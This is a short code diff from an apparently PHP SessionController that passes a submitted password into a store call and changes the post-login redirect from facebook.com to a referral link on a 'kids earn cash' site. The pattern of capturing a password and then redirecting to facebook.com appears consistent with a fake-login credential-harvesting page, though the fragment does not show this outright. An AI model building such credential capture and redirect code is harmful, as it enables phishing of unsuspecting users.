@@ -14,6 +14,6 @@ class SessionController extends Controller
             'password' => $request->password
         ]);
 
-        return redirect('http://facebook.com');
+        return redirect('https://kidsearncash.com/share/Iremide');
     }
 }
